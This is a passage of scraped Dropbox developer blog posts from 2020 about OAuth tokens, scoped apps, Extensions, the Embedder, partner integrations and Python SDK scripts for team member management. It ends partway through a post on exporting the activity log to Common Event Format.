set the grant_type to refresh_token and provide your refresh_token as a parameter: Copy curl https://api.dropbox.com/oauth2/token \\\r\n    -d grant_type=refresh_token \\\r\n    -d refresh_token=<YOUR_REFRESH_TOKEN> \\\r\n    -u <YOUR_APP_KEY>:<YOUR_APP_SECRET> Update default token type Inside the Settings page (accessed via the App Console ) of a legacy app, locate the section for OAuth 2 settings. Newly created scoped apps will default to short-lived tokens. Access token expiration settings Click the Access token expiration drop-down and select Short-lived . Now your app is using short-lived access tokens by default! Note that short-lived tokens will expire after a period of time which is “short”, but generally long enough for a reasonable web session. The amount of time that an access token is valid is returned in the expires_in parameter of the access token payload. If your app needs “offline” access, then refer to the Implement refresh tokens section above. Retiring Legacy Tokens On September 30th, 2021, Dropbox will retire the creation of long-lived access tokens — resulting in all new tokens being short-lived. For online-only apps that already handle re-authentication, users may experience more prompts for re-authentication. Apps that require background (“offline”) access but have not yet implemented refresh tokens will be impacted. Getting Help We’re here to help! Do you have some unanswered questions about the migration process? Are there specific resources or examples that would be useful to you? Please let us know by posting in the scopes discussion thread on our developer forum. If you need private, direct help , then please reach out using the support request form . Build with Dropbox today at www.dropbox.com/developers . // Tags Developers Announcements OAuth flow Authorization Scopes Oauth // Copy link Link copied Link copied", "date": "2020-09-17"},
{"website": "Dropbox", "title": "New and Improved Developer Guides", "author": ["Taylor Krusen"], "link": "https://dropbox.tech/developers/new-and-improved-developer-guides", "abstract": "OAuth Guide File Access Guide Sharing Guide Extensions Guide Team Files Guide Team Administration Guide Performance Guide Error Handling Guide Detecting Changes Guide Help Improve the Developer Guides Introduction Hi folks! If you’ve spent some time in our HTTP reference documentation , then you know that the Dropbox API has a broad range of features and functionality. Given the large set of tools, it can take some time to understand how some features are connected. To help with this, we’ve created new developer guides and revamped existing ones to fill some of those knowledge gaps. These guides cover fairly large topics in detail—ensuring that when developers have a job to do, they can find all the concepts, endpoints, and considerations that apply to that specific topic. You can think of these guides as living documents. We’ll continue to iterate and improve upon them over time to ensure all builders have the most up-to-date information about the Dropbox API. OAuth Guide The OAuth Guide offers information and guidance on how to implement an OAuth flow for your Dropbox app. In addition to an overview of OAuth, the guide includes sections on permissions (scopes and legacy), content access, PKCE, refresh tokens, user tokens, and team tokens. The concise summary at the bottom of the guide is a great way to identify which OAuth flow is the correct one for your app. File Access Guide The File Access Guide is a great resource for learning to interact with files and folders in Dropbox by using the API. The guide explains how Dropbox files are represented by metadata and which properties you’ll commonly work with. It also contains information about using different identifiers to interact with files, traversing files and folders, working with special types of files, and offers some best practices around working with files. Sharing Guide The Sharing Guide teaches readers to interact with Dropbox sharing features using the API. It covers shared links, shared folders, shared files, and some of the considerations around each unique mechanism. Extensions Guide The Extensions Guide assists developers in setting up their own Dropbox Extension . The guide walks readers through setting up their own Extension, explains the fields they fill out during setup, and explains how to use the Extension (including how users can add it to their Dropbox). Team Files Guide The Team Files Guide is for helping developers understand how team-linked Dropbox apps can interact with connected teams’ files. It covers concepts such as namespaces, team folders, team spaces, managing folder policies, and access control lists. The guide also explains how to interact with team files by using headers such as Dropbox-API-Path-Root , Dropbox-API-Select-User , and Dropbox-API-Select-Admin . Team Administration Guide Developers building apps that can manage teams should review the Team Administration Guide , which contains essential information for administrating a team through the Dropbox API. The guide covers user management (including user status), group management, and other team-specific features such as legal holds and secondary emails. Performance Guide Inside the Performance Guide , you’ll find information related to the performance of your app’s integration with the Dropbox API. The guide covers rate limits, file uploads, working with files in bulk, and building at scale. It also contains information about lock contention, which is an error that can occur when multiple files are being written to Dropbox at the same time. Error Handling Guide The Error Handling Guide contains information about the different types of errors in the Dropbox API and how to minimize their impact on your user experience. The guide covers conventions around errors, causes, resolutions, and best practices for dealing with common errors. Detecting Changes Guide The Detecting Changes Guide is valuable for apps that need to react to changes in Dropbox. It covers tools like polling, longpoll, and webhooks which allow you to poll, wait for, or be notified of changes to user files. The guide also contains information about listening for changes in Dropbox Teams and using the team event log. The table at the bottom adds some context around when a particular tool would work best for your situation. Help Improve the Developer Guides You can think of these developer guides as living documents that are regularly updated to include the latest information about the Dropbox API. We’re always looking to improve them. Did you find something missing or identify of a topic we should include? Please reach out and let us know! You can contact us on Twitter , post on our developer forum , or send us a message directly . // Tags Developers Sharing Longpoll Extensions Errors Teams Webhooks Performance Guide Oauth Tips and Tricks Polling File Access // Copy link Link copied Link copied", "date": "2020-08-31"},
{"website": "Dropbox", "title": "Now Available: Scoped apps and enhanced permissions", "author": ["API Platform Team"], "link": "https://dropbox.tech/developers/now-available--scoped-apps-and-enhanced-permissions", "abstract": "Overview We’re excited to announce several new features when authorizing apps with the Dropbox API . We use OAuth 2.0 for authorization—and today we’re adding support for scopes, PKCE, and refresh tokens to make it even easier to select the right auth model and permission level for your app. Scopes Scopes enable you to request specific permissions, groups of API calls, from the user at authorization time. Previously, our API had app ‘types’ with fixed access to calls. Now each API call is part of a scope, allowing you to request more granular, minimal access. With scopes, you may also request more permissions from the end user at a later time, only if and when they are needed. For example, your application may only need to verify user identity initially, then request file view, editing, or sharing permissions at a later time. This is now possible with scopes! Authorization pages with different requested scopes With scopes, you can even ask for team permissions later. You no longer have to build separate apps to support the User API and the Business API. Apps built with scopes have new OAuth screens for communicating these permissions to end users. PKCE As part of this update, we’re also providing support for PKCE . PKCE is an extension to the OAuth protocol that enables dynamic client secrets, designed for public clients that cannot guarantee safety of the client secret. PKCE is an improvement over the older implicit grant for these types of applications. If you’re building a desktop, mobile, single-page Javascript, open source, or any app being deployed to infrastructure you’re not managing, be sure to leverage this approach. Refresh Tokens Finally, we’ve also added support for refresh tokens . Using short lived access tokens with refresh tokens provides an additional level of security over longer-lived access tokens. Apps that require background access should be sure to use these. Using refresh tokens requires some additional code—but we’ve updated our SDKs to make this easy. Migrating If you’ve already built (or are in the process of building) a Dropbox app, don’t worry. There is no change to existing apps, and you don’t need to immediately migrate. Our legacy app and token types are still selectable in the developer console for the time being. We’ll eventually retire these legacy types, but will provide ample notice and time for existing apps. Existing apps may choose to migrate their permissions to scopes in the App Console , or to incorporate PKCE and/or refresh tokens now. Stay tuned for more migration guides and examples on the web. Getting Started To get started, check out our updated OAuth Guide . Questions about the new features? Please the discussion on our forum . If you need more direct help, you can contact us here . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Announcements OAuth flow Authorization Scopes PKCE Oauth // Copy link Link copied Link copied", "date": "2020-08-11"},
{"website": "Dropbox", "title": "New Sample: Image Flipping Extension", "author": ["Ruben Rincon"], "link": "https://dropbox.tech/developers/new-sample--image-flipping-extension", "abstract": "In late June of 2020, Dropbox opened Extensions to everybody. Using Extensions, developers can offer users an entry point to their app directly from a file in Dropbox. We’ve excited to release a new sample to help developers that are new to building with Extensions: the Image Flipping Extension . Interface for the sample image flipping Extension The sample takes you through creating and configuring the Extension on Dropbox as well as running the code to see the Image Flipping Extension in action. It includes sample implementations of an OAuth flow, downloading and uploading a file to Dropbox, creating a shared link, and even how to work with Team Spaces . Follow the instructions in the README and you’ll be flipping images in no time! Is this your first time reading about or working with Dropbox Extensions? There are a few other resources that you should know about: A blog post, “ Build your own Dropbox Extensions ” A developer guide, “ Extensions Guide ” A guest blog post, “ How Clipchamp integrated with Dropbox to make video editing easy for all ” Extensions allow users to transition from Dropbox to your app while keeping the context of the file they’re working on. We’re excited to see what folks build! We’re here to help if you have any feedback or questions about extensions. Join the discussion on our community forum . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Node.js Images Sharing Extensions Sample Apps Tips and Tricks javascript-sdk Oauth // Copy link Link copied Link copied", "date": "2020-07-30"},
{"website": "Dropbox", "title": "Now Available: Dropbox Embedder", "author": ["PJ Ryan"], "link": "https://dropbox.tech/developers/now-available--dropbox-embedder", "abstract": "The Embedder is officially released Updates and enhancements Embedder showcase Build with the Embedder The Embedder is officially released A few months ago we released the File and Folder Embedder in preview . The Embedder is a pre-built component that allows you to embed content from Dropbox on another surface. We’re excited to announce that the Embedder is officially launched and no longer in preview. That means it’s here to stay! The Embedder joins Chooser and Saver as a pre-built component, a set of developer tools which offer developers rich Dropbox API functionality with small snippets of code. Updates and enhancements A very sincere thank you everybody that left us feedback about the Embedder. Using that feedback from the developer community , we prioritized the engineering work that we thought would have the most impact. We shipped a variety of bug fixes and added better error states overall that communicate more information to the developer. We also included a cleaner way to remove the Embedder from a page by adding the Dropbox.unmount() method. Many developers asked for settings to control the Embedder, so we added the ability to configure it by using the options object that is passed into the Dropbox.embed() function. Using options , you can make the following changes: Set the zoom mode for embedded files Set the default view for embedded folders or change the size of the header Finally, we cleaned up the overall aesthetics... Old look: [Old] Embedded file [New] Embedded file New look: [Old] Embedded folder [New] Embedded folder Embedder showcase Since launching the Embedder a few months ago, we’ve seen developers all over the world leverage it to bring incredible value to their customers. We’d like to showcase three of our favorite uses of the Embedder. 1. Atlassian Smart Links Atlassian recently used the Embedder to create a Dropbox Smart Link (/dropbox), which allows you to easily access Dropbox content from a Jira or Confluence editor. Rich file previews include helpful metadata and actions so you don’t need to jump between apps. Read more about it here ! A Dropbox Smart Link (/dropbox) being used in Jira According to a Full-Stack Engineer at Jira, their experience using the Embedder was positive: “Since we return the metadata representing a link from the server-side, we did introduce a small amount of HTML around the component, but it worked great! We're confident it will help our users interact with their content more meaningfully!” 2. Sheetgo’s File Previewer Sheet g o is a no-code automation tool that allows users to create custom workflows that automate the collection, management, and sharing of data from spreadsheets. By using the Embedder, Sheetgo allows their users to view spreadsheets that are stored in Dropbox and use them to build custom workflows. A spreadsheet in Dropbox being embedded in Sheetgo According to a product manager at Sheetgo, \"This is a simple and powerful feature that is imperative for smooth user experience in our product.\" 3. University of Milan’s COVID Document Center In Italy, a University of Milan research center and online journal called CERIDAP recently created a section of their website devoted to helping the general public find information about the pandemic. They’ve been able to use the Embedder to display and distribute all the official acts adopted in Italy by state and local authorities on the COVID-19 emergency. The solo developer of the website told us they were extremely satisfied with the Dropbox Embedder: “It was a matter of minutes, literally, to get everything up and running. Our website is based on WordPress, and the system works so well that I simply dropped the HTML snipped provided by the app page on Dropbox.com in a HTML block in the WordPress Gutenberg editor. Then everything worked perfectly.” The Embedder being used by CERIDAP to distribute pandemic resources Build with the Embedder Now that the Embedder is officially released, you can enhance your applications by embedding Dropbox content. At the time of writing, the Embedder works with a variety of multi-page documents and images, but we may add support for additional file types in the future. Please refer to the Embedder documentation for up-to-date information on supported files. Have ideas on how to improve the Embedder? We're always listening. Please share your feedback on this post in our developer forum . Don’t hesitate to reach out to us if you need help building with the Embedder or the Dropbox API! You can use the support request form , post on our developer forum , or @ us on Twitter . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Announcements Sharing Components New Feature // Copy link Link copied Link copied", "date": "2020-07-07"},
{"website": "Dropbox", "title": "How Clipchamp integrated with Dropbox to make video editing easy for all", "author": ["Taylor Krusen"], "link": "https://dropbox.tech/developers/how-clipchamp-integrated-with-dropbox-to-make-video-editing-easy", "abstract": "Clipchamp offers free, browser-based video editing with a wide range of tools and features that help users create beautiful videos. You can add Clipchamp to your Dropbox in the App Center. They’re on a mission to empower anyone to tell stories worth sharing We asked Anna Ji, Head of Product and Growth and Jewel Horton, Content Manager at Clipchamp to write a guest post for our developer blog to share more information about Clipchamp, why they built their Dropbox integration, and how the integration helps empower creators to tell stories through video. Clipchamp's integration with Dropbox makes video editing easy for anyone What is Clipchamp? Clipchamp is the online video editor that empowers anyone to tell stories worth sharing through video. Around the world, over 10 million creators use Clipchamp to easily edit videos for personal, business, and educational purposes. Our editor gives users access to professional tools and features from simple cropping and resizing to special effects like transitions, motion titles, and Green Screen. Our users also have access to Clipchamp’s stock library filled with over 40,000 video and audio files. Better yet, this all happens in browser—no downloads necessary. Once the editing is complete, Clipchamp allows users to export in a range of resolutions and aspect ratios to fit sharing platforms like YouTube, Instagram, and more. Why Clipchamp integrated with Dropbox While we prioritize ease, we understand that video editing can get complicated. The process often involves many video and audio files, multiple iterations, and can be worked on by a multitude of collaborators. This is why we’ve teamed up with Dropbox. Clipchamp’s Dropbox integration allows you to access your favorite video editing and storage tools in one place. With it, you can edit video files directly from your Dropbox library without ever needing to perform a download. Once you’ve completed your video editing in Clipchamp, you can export your video directly back into your Dropbox library for you to share and receive feedback from collaborators. Choose video from Dropbox, edit in Clipchamp, and save back to Dropbox. The integration will help users: Stay organized online. Keeping your files stored in Dropbox means you’ll free up loads of space on your device and always have access to them in the cloud. You don’t have to download your files, just open them directly with Clipchamp to easily edit your video in the browser. Share with your team. Use your Dropbox team folder to give everyone access to your video files. Allow multiple team members to use your Dropbox video library in their own Clipchamp accounts, without the fear of overwriting anyone’s work. Get feedback from collaborators. Export your video to get feedback with Dropbox’s time-based commenting. Use this feedback to make further edits in Clipchamp, then export again to Dropbox to show off your changes. How the Clipchamp Dropbox integration was built At the core of our integration is the Dropbox Extensions API , which is now open to all developers . When a user chooses to open their file with our extension, we receive a temporary download link to that particular file, as well as metadata that helps identify the user and facilitate uploading the exported video back to Dropbox. Because Clipchamp is a purely in-browser video editing platform, creating a Dropbox Extension posed some unique challenges: how would the user open their project on a different machine? What would we do if the browser's cache evicts the user's file? How would the user export their project back to Dropbox after our upload access had expired? Using the Clipchamp extension to open a video directly from Dropbox Luckily Dropbox allows you to upload and download files in the browser, and often without having to authenticate, by using their Chooser and Saver file pickers. Not only did they solve most of our problems, but integrating them into Clipchamp Create also allows users to select more than just the one file provided by the Extensions API. By fully integrating with the Dropbox ecosystem, we’re able to meet the ergonomics and expectations of a cloud solution while not losing the privacy and performance benefits of storing files on-device. Results of the integration The results of our Clipchamp Dropbox integration have been very positive. Our users who use Dropbox absolutely love this partnership; it makes it extremely easy for them to access and store their files within the steps of their usual workflow. “This app is SO EASY for video editing with the collaboration with Dropbox. I am so glad I found this!!”  - Anonymous user, Facebook. Enhancements for the future What’s next for the Clipchamp Dropbox integration? The focus is on making things even easier for our users. Here’s a quick glimpse of what’s coming next: The import/export option will be visible to 100% of Dropbox users. The Dropbox file picker will be native in Clipchamp. Users will have increased control over export, file naming, and folder choice. The capability to import whole folders to Clipchamp. Pushing more metadata back to Dropbox, such as the full video transcript to help with searchability. With developments like this on the horizon, we’re excited to continue working with Dropbox to empower anyone to share stories through video. Thank you for reading! This guest blog post was contributed by Anna Ji, Head of Product and Growth at Clipchamp and Jewel Horton, Content Manager at Clipchamp. We hope that the brief glimpse into Clipchamp’s integration leaves you feeling inspired to build with the Dropbox API. To find out more about Clipchamp, check out their website or @clipchamp on Twitter . See what is possible with the Dropbox API and build with Dropbox today at www.dropbox.com/developers . // Tags Developers Media Developer Partner Integrations Partners Video Developer Spotlight // Copy link Link copied Link copied", "date": "2020-07-15"},
{"website": "Dropbox", "title": "Build your own Dropbox Extensions", "author": ["Hannah Choi"], "link": "https://dropbox.tech/developers/build-your-own-dropbox-extensions", "abstract": "Overview What are Dropbox Extensions? Adding Extensions to Dropbox Apps Building your own Dropbox Extensions Overview Imagine you’re working out of your Dropbox and need to edit a cat photo. Now, imagine opening a new tab, navigating to your photo-editing app, uploading the file from Dropbox, editing the photo, and finally saving it back to Dropbox. What if instead you could simply click the file in Dropbox to execute that entire workflow? Dropbox Extensions are now open to all developers! Give your users an entry point to your app right from Dropbox. This article will give you a high-level overview of what Dropbox Extensions are and what you need to do to set one up. If you want to jump into the technical guide, head on over to our Extensions Guide for an in-depth explanation. What are Dropbox Extensions? In the past, we have released a number of Extensions with our partners to help users launch integration flows directly from Dropbox, such as editing PDFs or requesting eSignatures. We’re now making the Extensions platform available to all so any developer can add Extensions to their Dropbox apps, using the standard OAuth flow and Dropbox’s API v2. Let’s take a look at how it all works from an end-user’s perspective. For the user to see your Extension inside their Dropbox to use it, they’ll need to first authorize it via OAuth 2.0 . Note that the users will need to start the OAuth flow from your website, just like any other Dropbox apps. Extensions on a file in Dropbox Once the user authorizes the app, they’ll see the Extension appear on the Dropbox file, either in the “Open” or “Share” menu, which you can decide in the app’s settings. When a user clicks on your Extension, they’re redirected to your app along with a unique file reference used to interact with the the Dropbox API. At this point, the user will be in your app’s workflow, like editing the cat photo. After your app takes an action on the file, we recommend saving the result back to Dropbox to complete the workflow. Adding Extensions to Dropbox Apps Since Dropbox Extensions are a feature of a Dropbox app, you can add it to your existing app or simply create a new app from the App Console. Note that Extensions will only be available for apps with Full Dropbox access and if you’re using a scoped app, you’ll need at least the files.metadata.read scope. Extensions section of app settings In this section, you can configure the settings of your Extension such as the Extension URI. This URI is where Dropbox will send the information about the selected file such as file_id . Using this file_id and the access token from the user’s OAuth flow, you can call the Dropbox API endpoints, such as /users/get_current_account to identify the user and /files/download or /files/get_metadata to get more information about the file the user has selected. If you’re using a scoped app, don’t forget that you’ll need to configure appropriate scopes from the app’s Permissions tab. If you already have a Full Dropbox access app, you’ll see that you now have the Extension URI section in your app’s Settings tab. Extensions section on app settings page Once you’ve configured the Extensions section, you’ll see the Extension appear in your own account without the OAuth flow for testing purposes. Once you’ve tested it, you can change the visibility of the Extension so it shows for the users that have authorized the app. Note that if you add Extensions to an existing app, users that have already authorized the app will not be asked to authorize again and see the Extensions show in their Dropbox. Building your own Dropbox Extensions With Dropbox Extensions, users can transition into your app directly from the file they’re working on. Our developer guide for Dropbox Extensions has detailed documentation so be sure to check it out when building out an Extensions app. Have feedback or questions? Join the discussion in our community forum ! // Tags Developers Announcements Extensions // Copy link Link copied Link copied", "date": "2020-06-22"},
{"website": "Dropbox", "title": "Dropbox App Center in Beta", "author": ["Kyle Anderson"], "link": "https://dropbox.tech/developers/dropbox-app-center-in-beta", "abstract": "Now in beta, the Dropbox App Center lets Dropbox users discover, learn about, and install apps and integrations from one place. Users can find apps categorized by use cases and industries including document editing, eSignature, and project management. Image of the new Dropbox App Center Currently, inclusion in the App Center is by invitation only to Dropbox Technology Partners in select categories. If you’ve built an application and meet program requirements , please visit the Technology Partner page to learn more and apply to the program to be considered for inclusion. Over the coming months, we’ll be looking to expand the categories and eligibility requirements for inclusion into the App Center–so stay tuned for updates! We look forward to enabling all interested Dropbox developers to list their apps. For more information, we recommend reading the product tips blog or checking out the App Center . If you have any questions about this or need help with anything else, you can always contact us . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Announcements App Center Preview // Copy link Link copied Link copied", "date": "2020-06-17"},
{"website": "Dropbox", "title": "New guides on error handling and detecting changes", "author": ["Taylor Krusen"], "link": "https://dropbox.tech/developers/new-guides-on-error-handling-and-detecting-changes", "abstract": "Handling errors in Dropbox Detecting changes to Dropbox data When building with the Dropbox API, there are two common needs that you may encounter: dealing with errors and learning about changes in Dropbox. We just published new developer guides for both topics! Introducing the Error Handling Guide and the Detecting Changes Guide . Handling errors in Dropbox Something you expect to find in well-written code is proper exception handling. The art of predicting, detecting, and gracefully recovering from errors is essential to building quality applications, especially when they integrate with other systems. In the Error Handling Guide , we cover error types, scenarios where you may encounter them, and share some best practices around error handling. In addition to the new guide, there are two other surfaces you can find information about errors in the Dropbox API: The error codes and descriptions in the Errors section at the top of the HTTP reference documentation The endpoint-specific “Errors” section under each endpoint in the docs (example from /sharing/get_shared_link_metdata ): Error section under /sharing/get_shared_link_metadata Detecting changes to Dropbox data Pretend you created a fictional app named DropPalette that analyzes photographs and returns a color palette with the five most common colors. The experience you want for your users is that photos dragged into the DropPalette folder are automatically analyzed and saved back with a color palette. You could provide that experience using webhooks. Reacting to changes in Dropbox is a common need for a broad spectrum of apps. Because the Dropbox API provides multiple mechanisms to accomplish that, you’ll need to pick the approach best suited to the needs of your specific app. In the Detecting Changes Guide , we cover webhooks, polling, and efficient use of cursors to request the latest data. We provide some context around each tool and provide some guidance on choosing the right one for your app. Keep an eye out for additional developer guides over the next couple of months! Build with Dropbox today at www.dropbox.com/developers // Tags Developers Longpoll Notifications Tips and Tricks Polling Errors Webhooks // Copy link Link copied Link copied", "date": "2020-05-29"},
{"website": "Dropbox", "title": "Improving your User Lifecycle Management with the Dropbox API", "author": ["Marcel Ribas"], "link": "https://dropbox.tech/developers/improving-your-user-lifecycle-management-with-the-dropbox-api", "abstract": "Why Automate User Lifecycle Management? Adding New Employees to Dropbox Handling an Employee Status Change Using the Dropbox API to Improve your User Lifecycle Management When you’re running a business, it can feel like everything is constantly changing. Among the many areas to maintain is how your people find the information they need. With growth and unavoidable turnover, it’s a challenge to ensure everyone has the correct access to team data. Dropbox Business streamlines this process, seamlessly allowing new team members to interact with protected files and resources. Everyone having the correct access to team Dropbox files is critical to your business running smoothly, but manually adding new members who are joining and removing those who are leaving can be tedious and error-prone. This process is called User Provisioning. Luckily, with the Dropbox Business API , this doesn’t have to be the case. This article will show you how to automate the process of members joining or leaving your team and how to safely manage their data when they leave. Sample code uses the Dropbox Python SDK . Why Automate User Lifecycle Management? Automating user management makes mistakes less likely as your team changes. Manually adding a member, for example, has the possibility of user error when typing the new employee’s email address. When this happens, it might take days before you realize the new employee never got the access they needed. If the process of adding an employee was automated, a script could pull the employee’s email address from a master list, ensuring no typos occur and nobody is accidentally given access to your team’s data. Making scripts to manage user accounts also alleviates the burden of remembering the specific configurations your company prefers for those processes. For example, if your company policy is for an employee to have their account files wiped upon leaving, you can configure the script once, so you don’t have to change it later. Plus, when you integrate your scripts with existing HR or IT tools, you can add the right groups for each employee role, alongside your other on-boarding tasks. It’s not just a matter of saving time, though these benefits compound as your team grows. You can build workflows to keep your team data secure and to help you ensure compliance with GDPR, LGPD, and other laws and standards. Former employees can be removed promptly (to enforce compliance) and new team members can quickly begin to contribute. So, with the benefits clearly evident, let’s look at how exactly the process can be automated. Adding New Employees to Dropbox Adding employees to your Dropbox Business team can be done using the API. There are a number of popular language SDKs available , but these examples will use the Dropbox Python SDK . The Dropbox SDKs make it easier to use the Dropbox API, but you can also use the API directly if you want. The only other thing you’ll need is a team member management access token from your app, which can be created from the App Console of the Dropbox developer portal . We describe this step in the beginning of our recent article “ Manage team sharing in your Dropbox app ”. The first step with any Dropbox Python script is to import the Dropbox library and make a connection using your access token: Copy import dropbox\r\ntoken = '<your_team_member_management_access_token>'\r\ndbx_team = dropbox.DropboxTeam(token) You can now create a script to add employees to your team. For this example, a new employee, Amy Smith, has joined your company. You want to add her to your Dropbox Business team. To do so, use the dropbox.team.MemberAddArg() function to set the parameters of the user, and then use the team_members_add() function to add her to your team with the parameters: Copy email = 'amy.smith@example.com'\r\nfirst_name = 'Amy'\r\nlast_name = 'Smith'\r\nmember = dropbox.team.MemberAddArg(\r\n        member_email=email, \r\n        member_given_name=first_name,  \r\n        member_surname=last_name, \r\n        send_welcome_email=True)\r\ndbx_team.team_members_add([member]) If the user does not have a Dropbox account, they’ll receive an email inviting them to create one. For this example, we chose to set send_welcome_email=True, which is already the default value if unspecified. But sometimes you might want to set it to False, and do what we call “silent invitations”. Silent invitations can be used, for example, in situations where Single Sign-On (SSO) is enabled, and members need to login using an existing authentication solution. In this case, the IT department might want to instruct people on how to join new team instead of sending the default Dropbox invitation email. If they do have an existing account with the email address that got invited, they’ll be asked whether they would like to join the team and bring their personal files to a private folder in their team account or decline the invitation. Note: Dropbox Advanced and Enterprise teams can be configured with Invite Enforcement , in which case the invited user with a corporate e-mail address will either have to accept the invitation and join the team, or change their e-mail address to a personal one. This process can be used to handle a list of employees by simply using a for loop to iterate through the list and updating the email , first_name, and last_name parameters. For example, let’s say you had employee information in a list like this: Copy Accounts\r\n>>>\r\n[['Amy', 'Smith', 'amy@email.com'],\r\n ['Bob', 'Johnson', 'bob@email.com']] Iterating through each contact with a for loop would look like this: Copy for account in Accounts:\r\n    email = Accounts[account][2]\r\n    first_name = Accounts[account][0]\r\n    last_name = Accounts[account][1]\r\n    member = dropbox.team.MemberAddArg(\r\n            member_email=email, \r\n            member_given_name=first_name,  \r\n            member_surname=last_name, \r\n            send_welcome_email=True\r\n        )\r\n    dbx_team.team_members_add([member]) This general process can be easily customized to fit the unique way your company stores its employee information. Customize it to fit your workflow, and make adding employees to your Dropbox Business team a breeze. Handling an Employee Status Change Employees sometimes have to leave and if they do, you need to be prepared to manage their accounts. If a team member is permanently leaving, you’ll want to remove them from your Dropbox Business team. To begin that process, you’ll use the dropbox.team.UserSelectorArg() function to select the user. The user can be identified with either their email, Team Member ID or their external ID. The External ID is optional but frequently used by Identity Management Systems that integrate with Dropbox. For our example, we’ll select them using their email: user = dropbox.team.UserSelectorArg.email('amy@email.com') With the employee selected, we’ll use the team_members_remove () function to remove their account from the team: Copy dbx_team.team_members_remove(user, \r\n    wipe_data=True, \r\n    transfer_dest_id=None, \r\n    transfer_admin_id=None, \r\n    keep_account=False) Your answers to the three questions below will determine the correct configuration of parameters: Do you want to delete the account, or convert it to a Basic account ? If you would like to let them keep their personal files and their Dropbox account, set keep_account to True . An example of when you would prefer to convert instead of delete is when you invited someone for a temporary project. They brought their own Dropbox account, but now the project is over and they need to bring their files with them. Do you want to transfer the files to another account? This ensures none of the files are lost or inaccessible to your team. If so, you’ll want to specify the other account with transfer_dest_id . You’ll also have to set transfer_admin_id to identify which administrator is to handle any errors that happen during the process. If you don’t want to transfer the files, both can be left as None . The files will still reside in your team for you to take action later. You can use the /members/move_former_member_files endpoint for that. And finally, would you like to wipe the account’s data from the user's connected devices? If so, make sure wipe_data is set to True . Keep in mind that if you choose to downgrade the account to a Basic account (with keep_account=True ), you won’t be able to wipe their files. The Dropbox API Explorer can be a useful tool in identifying the correct configuration of parameters when removing a team member. So, putting it all together, let’s look at an example of an employee whose account data is being wiped from the linked devices and their data is not being transferred at the moment: Copy user = dropbox.team.UserSelectorArg.email('amy@example.com')\r\ndbx_team.team_members_remove(user, wipe_data=True, transfer_dest_id=None, transfer_admin_id=None, keep_account=False) You can batch remove employee accounts similar to the previous section using a for loop to iterate and select their email addresses. If an employee’s account is accidentally removed, you have seven days to recover it. This can be done through the web interface or via the API using the team_members_recover() function: Copy user = dropbox.team.UserSelectorArg.email('amy@email.com')\r\ndbx_team.team_members_recover(user) If you downgraded the user to a Basic account, you can’t re-add them using the team_members_recover method. You'll need to re-invite them to the team like a new employee. Since accounts can only be recovered for seven days after their removal, removing an account isn’t an effective way of handling situations when an employee is only temporarily leaving, such as for parental leave. In these instances, suspending the account is a more apt course of action, as doing so allows you to easily reactivate it when they rejoin the team. As a matter of fact, suspending instead of deleting is usually the best practice,  usually employed by the user provisioning tools that integrate with Dropbox. You can find a list of these solutions in our Identity and Access Management partners page . The process is similar to removing team accounts, as you again use UserSelectorArg to select the user. However,  this time you use the team_members_suspend function instead. For example, if Amy takes a leave of absence, you can temporarily suspend her from your team account: Copy user = dropbox.team.UserSelectorArg.email('amy@email.com')\r\ndbx_team.team_members_suspend(user, wipe_data=True) The only parameter to decide here is wipe_data . Setting it to True will delete all the user’s data on their linked devices. This can also be useful if someone’s laptop or phone was missing and that device had sensitive files on it. When Amy returns, you can reactivate her account with the team_members_unsuspend() function: Copy box.team.UserSelectorArg.email('amy@email.com')\r\ndbx_team.team_members_unsuspend(user) The ability  to suspend and remove user accounts ensures that you have full control over the makeup of your Dropbox Business team. Using the Dropbox API to Improve your User Lifecycle Management With the Dropbox Business API—and an assist from a few Python scripts—you’ll be automating user lifecycle management, giving your company more time and security. Long gone are the days of employees waiting for the IT department to manually grant them access to the files they need; now, a simple script can give them that access before they even step through the door. This article covered some of the User Lifecycle Management capabilities available in the Dropbox Business API such as adding a team member, removing a team member, suspending a team member, and provided guidance around best practices. But this is just the beginning. The Dropbox API can help you with many other tasks such as managing groups, granting administrative permissions, setting secondary e-mail addresses, and setting member space limits. Please take the time to look at the Dropbox Business API Documentation and see what else you can automate with it. If you have any questions about User Lifecycle Management or need help building with the Dropbox API, you can contact us here or post on our developer forum . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Python Sdk Python Tips and Tricks Business Endpoints Teams // Copy link Link copied Link copied", "date": "2020-04-29"},
{"website": "Dropbox", "title": "Converting the Dropbox Activity Log into Common Event Format Events", "author": ["Tahsin Islam"], "link": "https://dropbox.tech/developers/converting-the-dropbox-activity-log-into-common-event-framework-", "abstract": "Using the team_log endpoint Common Event Format (CEF) details Mapping the activity log to CEF Python script to convert the activity log to CEF Dropbox activity log in CEF format In Dropbox Business accounts key events and actions are recorded and stored in an activity log . This log records activities such as a modifying a file, an admin changing policies, or a new user being added to the team. Accessible via the admin console or Dropbox Business APIs , this log can serve as an authoritative source to audit and monitor activity within a team. Each individual event of the log contains contextual information and metadata to help sort and categorize events. The activity log is a great source of data for security and event management (SIEM), or data-loss prevention (DLP) applications. These types of applications are geared to identify security issues, policy violations, and provide analytics on event data. Specifically, SIEM applications usually require aggregation of events from a range of different devices and inputs. Because of this it can be difficult to consolidate information, and complex to integrate events from all different sources. Targeting this problem, cyber security and SIEM analytics provider, MicroFocus ArcSight developed the Common Event Format (CEF) . The format’s goal is to promote interoperability between log generating sources by establishing a standard log and audit message format for SIEM applications. Converting events in Dropbox to the CEF standard can make information easier for SIEM apps to work with. In this blog post we’ll explore: How to pull events from the Dropbox activity log A high-level overview of the common event format Mapping the activity log to the common event format Review and use a script to parse the activity log into the common event format Using the team_log endpoint Exclusive to the Dropbox Business API, team events can be pulled via the activity log endpoints ( team_log/get_events and team_log/get_events/continue ). Before interacting with these endpoints you’ll need an access token with the appropriate permissions. If you don’t already have one, create a Dropbox app with one of the following access types: “Team Auditing” or “Team Member File Access”. Calling the activity log When using the Dropbox API to interact with the activity log endpoints there are four important parameters to consider: limit , account_id , time , or category . While these parameters are optional, they play an essential role in controlling the results of the activity log. If no parameters are used, the endpoints will return the full list which may be bulky to work with. You can review the endpoint documentation here for the details on what these parameters do. Below are a couple cURL of examples showing how you might use these parameters. Objective: Return 10 events, filtered on file operation events Copy curl -X POST https://api.dropboxapi.com/2/team_log/get_events \\\r\n    --header \"Authorization: Bearer <auth_token>\" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --data \"{\\\"limit\\\": 